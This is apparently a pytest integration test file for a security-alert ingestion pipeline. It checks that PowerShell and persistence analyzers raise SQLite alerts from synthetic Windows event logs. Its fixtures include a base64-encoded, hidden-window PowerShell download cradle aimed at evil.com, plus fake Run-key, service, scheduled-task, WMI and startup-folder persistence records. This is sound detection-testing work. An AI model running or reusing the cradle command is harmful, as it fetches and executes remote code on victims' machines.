"""Integration tests for IngestionPipeline with PowerShellThreatAnalyzer and PersistenceAnalyzer.

Validates end-to-end telemetry ingestion, analyzer evaluation, alert creation,
forensic evidence linking in SQLite, and the run_analyzers toggle.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from app.analyzers.persistence_analyzer import PersistenceAnalyzer
from app.analyzers.powershell_analyzer import PowerShellThreatAnalyzer
from app.database.connection import DatabaseManager
from app.database.migrations import MigrationRunner
from app.database.repository import AlertRepository, EventRepository
from app.ingestion.pipeline import IngestionPipeline, IngestionResult
from app.models.events import EventCategory

MIGRATIONS_DIR = Path(__file__).resolve().parent.parent.parent / "app" / "database" / "migrations"


@pytest.fixture
def migrated_db(tmp_path: Path) -> DatabaseManager:
    """Fixture providing a fresh SQLite database migrated to latest schema."""
    db_file = tmp_path / "analyzers_integration.db"
    db_manager = DatabaseManager(db_path=db_file)
    runner = MigrationRunner(db_manager=db_manager, migrations_dir=MIGRATIONS_DIR)
    runner.apply_migrations()
    return db_manager


def test_analyzers_initialized_on_pipeline_init(migrated_db: DatabaseManager) -> None:
    """Test 1: Verify IngestionPipeline initializes PowerShell and Persistence analyzers."""
    pipeline = IngestionPipeline(db_manager=migrated_db)
    assert isinstance(pipeline.powershell_analyzer, PowerShellThreatAnalyzer)
    assert isinstance(pipeline.persistence_analyzer, PersistenceAnalyzer)

    # Custom analyzer injection
    custom_pwsh = PowerShellThreatAnalyzer()
    custom_pers = PersistenceAnalyzer()
    custom_pipe = IngestionPipeline(
        db_manager=migrated_db,
        powershell_analyzer=custom_pwsh,
        persistence_analyzer=custom_pers,
    )
    assert custom_pipe.powershell_analyzer is custom_pwsh
    assert custom_pipe.persistence_analyzer is custom_pers


def test_powershell_threat_creates_sqlite_alert(
    migrated_db: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Test 2: Verify high-risk PowerShell telemetry creates alert in SQLite alerts table."""
    # Encoded download cradle:
    # $w = New-Object Net.WebClient; $w.DownloadString('http://evil.com/payload.ps1')
    b64_cradle = "JAB3ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
    raw_cmd = f"powershell.exe -w hidden -nop -enc {b64_cradle}"

    event_record = {
        "System": {
            "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
            "EventID": 1,
            "TimeCreated": {"@SystemTime": "2026-11-04T12:00:00.000000Z"},
            "EventRecordID": 1001,
            "Computer": "VICTIM-PC",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
        },
        "EventData": {
            "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": raw_cmd,
            "User": "CORP\\Victim",
        },
    }

    log_file = tmp_path / "pwsh_attack.json"
    log_file.write_text(json.dumps([event_record]), encoding="utf-8")

    pipeline = IngestionPipeline(db_manager=migrated_db)
    result = pipeline.ingest_and_persist(
        file_path=log_file,
        run_detections=False,
        run_analyzers=True,
    )

    assert isinstance(result, IngestionResult)
    assert len(result.events) == 1
    assert result.inserted_count == 1
    assert len(result.powershell_results) == 1

    pwsh_res = result.powershell_results[0]
    assert pwsh_res.risk_score >= 60
    assert pwsh_res.severity in ("High", "Critical")
    assert result.alerts_created >= 1

    # Verify directly in SQLite alerts table
    with migrated_db.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT id, rule_id, severity, computer, user FROM alerts;")
        alerts = cur.fetchall()
        assert len(alerts) == 1
        alert_id, rule_id, severity, computer, user = alerts[0]
        assert rule_id == "PWSH-COMPOSITE-001"
        assert severity in ("High", "Critical")
        assert computer == "VICTIM-PC"
        assert user == "CORP\\Victim"


def test_powershell_alert_links_evidence_in_sqlite(
    migrated_db: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Test 3: Verify PowerShell threat links evidence in SQLite alert_evidence table."""
    b64_cradle = "JAB3ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
    raw_cmd = f"powershell.exe -w hidden -enc {b64_cradle}"

    event_record = {
        "System": {
            "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
            "EventID": 1,
            "TimeCreated": {"@SystemTime": "2026-11-04T12:05:00.000000Z"},
            "EventRecordID": 1002,
            "Computer": "VICTIM-PC",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
        },
        "EventData": {
            "ProcessGuid": "{22222222-3333-4444-5555-666666666666}",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": raw_cmd,
            "User": "CORP\\Victim",
        },
    }

    log_file = tmp_path / "pwsh_evidence.json"
    log_file.write_text(json.dumps([event_record]), encoding="utf-8")

    pipeline = IngestionPipeline(db_manager=migrated_db)
    result = pipeline.ingest_and_persist(file_path=log_file, run_analyzers=True)

    with migrated_db.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT id FROM alerts WHERE rule_id = 'PWSH-COMPOSITE-001';")
        alert_row = cur.fetchone()
        assert alert_row is not None
        alert_id = alert_row[0]

        cur.execute("SELECT alert_id, event_id, matched_field, matched_value FROM alert_evidence WHERE alert_id = ?;", (alert_id,))
        evidence_rows = cur.fetchall()
        assert len(evidence_rows) >= 1
        assert evidence_rows[0][0] == alert_id
        # event_id must point to the primary key in events table
        cur.execute("SELECT id FROM events WHERE event_id = 1;")
        ev_id = cur.fetchone()[0]
        assert evidence_rows[0][1] == ev_id


def test_benign_powershell_does_not_create_alert(
    migrated_db: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Test 4: Verify benign PowerShell scripts (Get-Process, Get-Service) do not create alerts."""
    event_record = {
        "System": {
            "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
            "EventID": 1,
            "TimeCreated": {"@SystemTime": "2026-11-04T12:10:00.000000Z"},
            "EventRecordID": 1003,
            "Computer": "VICTIM-PC",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
        },
        "EventData": {
            "ProcessGuid": "{33333333-4444-5555-6666-777777777777}",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -Command Get-Service",
            "User": "CORP\\Admin",
        },
    }

    log_file = tmp_path / "pwsh_benign.json"
    log_file.write_text(json.dumps([event_record]), encoding="utf-8")

    pipeline = IngestionPipeline(db_manager=migrated_db)
    result = pipeline.ingest_and_persist(file_path=log_file, run_analyzers=True)

    assert len(result.powershell_results) == 0 or result.powershell_results[0].risk_score == 0
    assert result.analyzer_alerts_created == 0

    with migrated_db.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM alerts;")
        count = cur.fetchone()[0]
        assert count == 0


def test_persistence_threats_create_sqlite_alerts_and_evidence(
    migrated_db: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Test 5: Verify PersistenceAnalyzer identifies Run key, Service, Task, WMI, and Startup threats."""
    events = [
        # 1. Registry Run key
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                "EventID": 13,
                "TimeCreated": {"@SystemTime": "2026-11-04T12:15:00.000000Z"},
                "EventRecordID": 2001,
                "Computer": "ENDPOINT-SEC",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
            },
            "EventData": {
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
                "Details": "C:\\Users\\Public\\malware.exe",
                "User": "NT AUTHORITY\\SYSTEM",
            },
        },
        # 2. Service Installation (EID 4697)
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Security-Auditing"},
                "EventID": 4697,
                "TimeCreated": {"@SystemTime": "2026-11-04T12:16:00.000000Z"},
                "EventRecordID": 2002,
                "Computer": "ENDPOINT-SEC",
                "Channel": "Security",
            },
            "EventData": {
                "ServiceName": "MaliciousService",
                "ServiceFileName": "C:\\Users\\Admin\\AppData\\Local\\Temp\\agent.exe",
                "SubjectUserName": "Administrator",
            },
        },
        # 3. Scheduled Task (EID 4698)
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Security-Auditing"},
                "EventID": 4698,
                "TimeCreated": {"@SystemTime": "2026-11-04T12:17:00.000000Z"},
                "EventRecordID": 2003,
                "Computer": "ENDPOINT-SEC",
                "Channel": "Security",
            },
            "EventData": {
                "TaskName": "\\Microsoft\\Windows\\Telemetry\\PersistenceTask",
                "TaskContent": (
                    "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
                    "<Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc JABz</Arguments></Exec></Actions>"
                    "</Task>"
                ),
            },
        },
        # 4. WMI Subscription (Sysmon EID 21)
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                "EventID": 21,
                "TimeCreated": {"@SystemTime": "2026-11-04T12:18:00.000000Z"},
                "EventRecordID": 2004,
                "Computer": "ENDPOINT-SEC",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
            },
            "EventData": {
                "Consumer": "CommandLineEventConsumer.Name=\"BackdoorConsumer\"",
                "Filter": "__EventFilter.Name=\"StartupFilter\"",
                "Operation": "Created",
            },
        },
        # 5. Startup Folder Drop (Sysmon EID 11)
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                "EventID": 11,
                "TimeCreated": {"@SystemTime": "2026-11-04T12:19:00.000000Z"},
                "EventRecordID": 2005,
                "Computer": "ENDPOINT-SEC",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
            },
            "EventData": {
                "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.bat",
                "Image": "C:\\Windows\\System32\\cmd.exe",
            },
        },
    ]

    log_file = tmp_path / "persistence_attack.json"
    log_file.write_text(json.dumps(events), encoding="utf-8")

    pipeline = IngestionPipeline(db_manager=migrated_db)
    result = pipeline.ingest_and_persist(file_path=log_file, run_analyzers=True)

    assert len(result.persistence_artifacts) == 5
    assert result.analyzer_alerts_created == 5

    # Check that each persistence type was recorded
    types = {art.persistence_type.value for art in result.persistence_artifacts}
    assert types == {
        "REGISTRY",
        "SERVICE",
        "SCHEDULED_TASK",
        "WMI_SUBSCRIPTION",
        "STARTUP_FOLDER",
    }

    # Verify SQLite alerts table has 5 alerts
    with migrated_db.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT rule_id FROM alerts;")
        rule_ids = {row[0] for row in cur.fetchall()}
        assert "PERS-REGISTRY-001" in rule_ids
        assert "PERS-SERVICE-001" in rule_ids
        assert "PERS-SCHEDULED_TASK-001" in rule_ids
        assert "PERS-WMI_SUBSCRIPTION-001" in rule_ids
        assert "PERS-STARTUP_FOLDER-001" in rule_ids


def test_run_analyzers_false_skips_execution(
    migrated_db: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Test 6: Verify run_analyzers=False suppresses threat analyzers."""
    event_record = {
        "System": {
            "Provider": "Microsoft-Windows-Sysmon",
            "EventID": 13,
            "TimeCreated": "2026-11-04T12:20:00.000000Z",
            "EventRecordID": 3001,
            "Computer": "TEST-HOST",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
        },
        "EventData": {
            "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
            "Details": "C:\\Temp\\evil.exe",
        },
    }

    log_file = tmp_path / "skip_test.json"
    log_file.write_text(json.dumps([event_record]), encoding="utf-8")

    pipeline = IngestionPipeline(db_manager=migrated_db)
    result = pipeline.ingest_and_persist(
        file_path=log_file,
        run_detections=False,
        run_analyzers=False,
    )

    assert result.powershell_results == []
    assert result.persistence_artifacts == []
    assert result.analyzer_alerts_created == 0

    with migrated_db.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM alerts;")
        assert cur.fetchone()[0] == 0


def test_ingestion_result_exposes_analyzer_properties(
    migrated_db: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Test 7: Verify IngestionResult exposes analyzer outputs and metadata."""
    event_record = {
        "System": {
            "Provider": "Microsoft-Windows-Sysmon",
            "EventID": 11,
            "TimeCreated": "2026-11-04T12:25:00.000000Z",
            "EventRecordID": 4001,
            "Computer": "TEST-HOST",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
        },
        "EventData": {
            "TargetFilename": "C:\\Users\\Victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan.exe",
        },
    }

    log_file = tmp_path / "prop_test.json"
    log_file.write_text(json.dumps([event_record]), encoding="utf-8")

    pipeline = IngestionPipeline(db_manager=migrated_db)
    result = pipeline.ingest_and_persist(
        file_path=log_file,
        run_detections=False,
        run_analyzers=True,
    )

    assert hasattr(result, "powershell_results")
    assert hasattr(result, "persistence_artifacts")
    assert hasattr(result, "analyzer_alerts_created")
    assert len(result.persistence_artifacts) == 1
    assert result.analyzer_alerts_created == 1
    assert result.alerts_created == 1
    assert len(result.alerts) == 1
    assert "PERS-STARTUP_FOLDER-001" in result.alerts[0]["rule_id"]


def test_mixed_attack_telemetry_end_to_end(
    migrated_db: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Test 8: Verify end-to-end ingestion of mixed attack telemetry with zero exceptions."""
    b64_cradle = "JAB3ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
    mixed_events = [
        # 1. PowerShell cradle
        {
            "System": {
                "Provider": "Microsoft-Windows-Sysmon",
                "EventID": 1,
                "TimeCreated": "2026-11-04T12:30:00.000000Z",
                "EventRecordID": 5001,
                "Computer": "VICTIM-PC",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
            },
            "EventData": {
                "ProcessGuid": "{1234-5678-0001}",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": f"powershell.exe -w hidden -enc {b64_cradle}",
                "User": "CORP\\Victim",
            },
        },
        # 2. Registry Run key persistence
        {
            "System": {
                "Provider": "Microsoft-Windows-Sysmon",
                "EventID": 13,
                "TimeCreated": "2026-11-04T12:31:00.000000Z",
                "EventRecordID": 5002,
                "Computer": "VICTIM-PC",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
            },
            "EventData": {
                "ProcessGuid": "{1234-5678-0002}",
                "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                "Details": "C:\\Users\\Victim\\AppData\\Local\\Temp\\update.exe",
                "User": "CORP\\Victim",
            },
        },
        # 3. Scheduled task persistence
        {
            "System": {
                "Provider": "Microsoft-Windows-Security-Auditing",
                "EventID": 4698,
                "TimeCreated": "2026-11-04T12:32:00.000000Z",
                "EventRecordID": 5003,
                "Computer": "VICTIM-PC",
                "Channel": "Security",
            },
            "EventData": {
                "TaskName": "\\Microsoft\\Windows\\Maintenance\\EvilTask",
                "TaskContent": (
                    "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
                    "<Actions><Exec><Command>cmd.exe</Command><Arguments>/c C:\\Temp\\evil.bat</Arguments></Exec></Actions>"
                    "</Task>"
                ),
            },
        },
    ]

    log_file = tmp_path / "mixed_attack.json"
    log_file.write_text(json.dumps(mixed_events), encoding="utf-8")

    pipeline = IngestionPipeline(db_manager=migrated_db)
    result = pipeline.ingest_and_persist(
        file_path=log_file,
        run_detections=False,
        run_analyzers=True,
    )

    assert result.inserted_count == 3
    assert len(result.powershell_results) == 1
    assert len(result.persistence_artifacts) == 2
    assert result.analyzer_alerts_created == 3
    assert result.alerts_created == 3

    # Check SQLite alerts and evidence records
    with migrated_db.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT rule_id FROM alerts ORDER BY id ASC;")
        rule_ids = [r[0] for r in cur.fetchall()]
        assert "PWSH-COMPOSITE-001" in rule_ids
        assert "PERS-REGISTRY-001" in rule_ids
        assert "PERS-SCHEDULED_TASK-001" in rule_ids

        cur.execute("SELECT COUNT(*) FROM alert_evidence;")
        evidence_count = cur.fetchone()[0]
        assert evidence_count >= 3
